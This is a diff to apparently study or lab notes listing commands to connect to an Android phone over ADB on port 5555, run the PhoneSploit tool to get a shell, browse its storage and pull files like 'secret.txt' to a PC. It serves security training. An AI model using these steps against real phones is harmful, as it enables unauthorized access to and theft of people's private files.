@@ -343,9 +343,7 @@ sudo apt-get install adb -y
 adb devices
 
 # Connection Establish Steps
-adb usb
-adb tcpip 5555
-adb connect xxx.xxx.xxx.xxxx
+adb connect 192.168.0.4:5555
 
 # PhoneSploit tool 
 git clone https://github.com/aerosol-can/PhoneSploit
@@ -356,9 +354,8 @@ python3 -m pip install colorama
 
 python3 phonesploit.py
 
-# Type 3 and Press Enter to Connect a new Phone
-# Enter IP of Android Device
-# Type 4, to Access Shell on phone, ENter IP if required
+# Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
+# Type 4, to Access Shell on phone
 
 pwd
 ls
@@ -366,9 +363,17 @@ cd sdcard
 ls
 cd Download
 
-# Download a File from Android
+# Download a File from Android using ADB tool
 adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
 adb pull sdcard/log.txt /home/mmurphy/Desktop
-```  
+  
+#Download File using PhoneSploit
+9. Pull Folders from Phone to PC
+
+Enter the Full Path of file to Download
+sdcard/Download/secret.txt
+
+  
+ ```  
 </details>
   
